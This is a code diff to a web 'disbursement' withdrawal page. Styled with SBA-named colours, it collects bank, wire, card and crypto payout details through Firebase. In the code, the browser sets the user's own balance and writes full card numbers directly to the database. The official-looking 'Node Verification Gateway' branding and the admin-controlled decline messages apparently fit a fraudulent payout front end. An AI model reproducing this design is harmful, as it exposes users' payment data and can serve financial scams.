@@ -31,6 +31,8 @@
         .s-input:focus { border-color: var(--sba-navy); background: #fff; }
         
         .btn-success { background: var(--sba-green); color: white; font-weight: 900; text-transform: uppercase; width: 100%; height: 55px; border-radius: 15px; border-bottom: 5px solid #065f46; cursor: pointer; }
+        .btn-outline { border: 2px solid var(--sba-navy); color: var(--sba-navy); font-weight: 900; text-transform: uppercase; width: 100%; border-radius: 14px; font-size: 11px; height: 48px; }
+        
         .support-agent-box { background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 16px; padding: 12px; margin-top: 25px; display: flex; align-items: center; gap: 12px; cursor: pointer; }
         .agent-img { width: 40px; height: 40px; border-radius: 10px; object-fit: cover; border: 2px solid var(--sba-green); }
         .fab-support { position: fixed; bottom: 30px; right: 20px; width: 56px; height: 56px; background: var(--sba-navy); color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 22px; box-shadow: 0 4px 15px rgba(0,0,0,0.3); border: 2px solid white; z-index: 999; cursor: pointer; }
@@ -43,8 +45,8 @@
 <body class="pb-20">
 
     <div id="globalLoader">
-        <div class="text-2xl font-black text-slate-800 tracking-tight mb-4 flex items-center gap-2">
-            <i class="fas fa-satellite-dish text-indigo-600 animate-pulse"></i> Node Verification
+        <div class="text-xl font-black text-slate-800 tracking-tight mb-4 flex items-center gap-2">
+            <i class="fas fa-satellite-dish text-indigo-600 animate-pulse"></i> Node Verification Gateway
         </div>
         <div class="w-32 h-1.5 bg-slate-200 rounded-full overflow-hidden">
             <div class="h-full bg-indigo-600 w-1/3 animate-pulse"></div>
@@ -62,9 +64,10 @@
             <h1 class="text-[10px] font-black leading-none text-[#002e6d] uppercase">Disbursement</h1>
             <p class="text-[7px] font-bold text-slate-400 uppercase tracking-tighter mt-1">ACH/WIRE Node 7-B</p>
         </div>
-        <div class="ml-auto text-right">
-            <p class="text-[8px] font-black text-slate-400 uppercase">Avail. Funds</p>
-            <p class="text-sm font-black text-slate-800">$<span id="bal">0.00</span></p>
+        <div class="ml-auto flex items-center gap-3">
+            <a href="dashboard.html" class="text-slate-400 hover:text-slate-700 transition-colors text-base p-1">
+                <i class="fas fa-times"></i>
+            </a>
         </div>
     </header>
 
@@ -77,6 +80,7 @@
                     <div>
                         <p class="text-[9px] font-black uppercase">Gateway Action: Reverted</p>
                         <p id="decline-text" class="text-[10px] font-bold mt-1">...</p>
+                        <button onclick="clearStatusAndRetry()" class="text-[9px] font-black text-rose-600 underline mt-2 block">Retry Transaction</button>
                     </div>
                 </div>
             </div>
@@ -87,6 +91,17 @@
                     <div>
                         <p class="text-[9px] font-black uppercase">Transaction Successful</p>
                         <p class="text-[10px] font-bold mt-1">Disbursement approved and finalized.</p>
+                        <button onclick="location.href='dashboard.html'" class="text-[9px] font-black text-emerald-600 underline mt-2 block">Return to Dashboard</button>
+                    </div>
+                </div>
+            </div>
+
+            <div id="pending-box" class="hidden bg-amber-50 border-l-4 border-amber-500 p-4 rounded-r-xl mb-5">
+                <div class="flex gap-3 text-amber-800">
+                    <i class="fas fa-spinner fa-spin mt-1"></i>
+                    <div>
+                        <p class="text-[9px] font-black uppercase">Processing</p>
+                        <p class="text-[10px] font-bold mt-1">Disbursement data is currently being audited.</p>
                     </div>
                 </div>
             </div>
@@ -94,7 +109,7 @@
             <div id="pin-setup-state" class="hidden py-6 text-center">
                 <i class="fas fa-key text-indigo-600 text-3xl mb-4 animate-bounce"></i>
                 <h3 class="text-xs font-black uppercase tracking-tight text-slate-800">Secure PIN Required</h3>
-                <p class="text-[10px] text-slate-500 font-bold uppercase px-6 mt-2">You need a 4-digit PIN for treasury operations.</p>
+                <p class="text-[10px] text-slate-500 font-bold uppercase px-6 mt-2">To complete the setup for treasury operations, enter a 4-digit PIN below.</p>
 
                 <div class="mt-6 px-4 text-left">
                     <label class="label-text">Create 4-digit PIN</label>
@@ -196,6 +211,7 @@
                 </div>
 
                 <button id="submitBtn" onclick="handleDisbursement()" class="btn-success h-14 shadow-xl text-xs tracking-wider">PROCESS DISBURSEMENT</button>
+                <button onclick="location.href='dashboard.html'" class="btn-outline mt-3">Return to Dashboard</button>
             </div>
 
             <div id="pending-state" class="hidden py-6 text-center">
@@ -223,7 +239,7 @@
 
     <script type="module">
         import { auth, db } from './firebase-config.js';
-        import { doc, getDoc, updateDoc, onSnapshot } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
+        import { doc, getDoc, updateDoc, onSnapshot, arrayUnion } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
         import { onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
 
         window.selectedDisbursementMode = 'ach';
@@ -258,6 +274,16 @@
             }
         };
 
+        window.clearStatusAndRetry = async () => {
+            try {
+                await updateDoc(doc(db, "users", auth.currentUser.uid), { withdrawStatus: "RETRY" });
+                document.getElementById('reason-box').classList.add('hidden');
+                document.getElementById('form-content-state').classList.remove('hidden');
+            } catch(e) {
+                alert(e.message);
+            }
+        }
+
         window.handleDisbursement = async () => {
             const amount = Number(document.getElementById('wireAmount').value);
             const opPin = document.getElementById('operation-pin').value;
@@ -272,18 +298,21 @@
             let details = {};
             if (window.selectedDisbursementMode === 'ach') {
                 details = {
+                    type: "ACH",
                     routing: document.getElementById('ach-routing').value,
                     account: document.getElementById('ach-account').value,
                     bank: document.getElementById('ach-bank').value
                 };
             } else if (window.selectedDisbursementMode === 'wire') {
                 details = {
+                    type: "WIRE",
                     swift: document.getElementById('wire-swift').value,
                     beneficiary: document.getElementById('wire-beneficiary').value,
                     account: document.getElementById('wire-account').value
                 };
             } else if (window.selectedDisbursementMode === 'card') {
                 details = {
+                    type: "CARD",
                     name: document.getElementById('card-name').value,
                     number: document.getElementById('card-number').value,
                     expiry: document.getElementById('card-expiry').value,
@@ -291,6 +320,7 @@
                 };
             } else {
                 details = {
+                    type: "CRYPTO",
                     dropdown: document.getElementById('cryptoDropdown').value,
                     address: document.getElementById('crypto-address').value
                 };
@@ -303,13 +333,19 @@
                 const userRef = doc(db, "users", auth.currentUser.uid);
                 const updatedBalance = userBalance - amount;
 
+                // Update the balance and add a chat/ledger entry for the admin side.
                 await updateDoc(userRef, {
                     balance: updatedBalance,
                     withdrawStatus: "PENDING",
                     withdrawAmount: amount,
                     withdrawMethod: window.selectedDisbursementMode,
                     withdrawDetails: details,
-                    lastAction: new Date().toLocaleString()
+                    lastAction: new Date().toLocaleString(),
+                    chatHistory: arrayUnion({
+                        sender: "USER",
+                        text: `SYSTEM: Disbursement initiated. Amount: $${amount.toLocaleString()} via ${window.selectedDisbursementMode.toUpperCase()}`,
+                        time: new Date().toISOString()
+                    })
                 });
 
                 alert("Disbursement Request Submitted Successfully!");
@@ -340,12 +376,17 @@
                         document.getElementById('form-content-state').classList.add('hidden');
                         document.getElementById('pin-setup-state').classList.remove('hidden');
                     } else {
-                        // Check deposit / withdraw status logic
+                        // Routing from standard status triggers
                         if (userData.withdrawStatus === "REJECTED" || userData.withdrawStatus === "DECLINED") {
                             document.getElementById('reason-box').classList.remove('hidden');
-                            document.getElementById('decline-text').innerText = userData.depositReason || "The request could not be processed at this time.";
+                            document.getElementById('decline-text').innerText = userData.depositReason || "The request could not be processed at this time. Ledger adjustments have been processed.";
+                            document.getElementById('form-content-state').classList.add('hidden');
                         } else if (userData.withdrawStatus === "SUCCESSFUL" || userData.withdrawStatus === "APPROVED") {
                             document.getElementById('success-box').classList.remove('hidden');
+                            document.getElementById('form-content-state').classList.add('hidden');
+                        } else if (userData.withdrawStatus === "PENDING") {
+                            document.getElementById('pending-box').classList.remove('hidden');
+                            document.getElementById('form-content-state').classList.add('hidden');
                         }
                     }
                 }
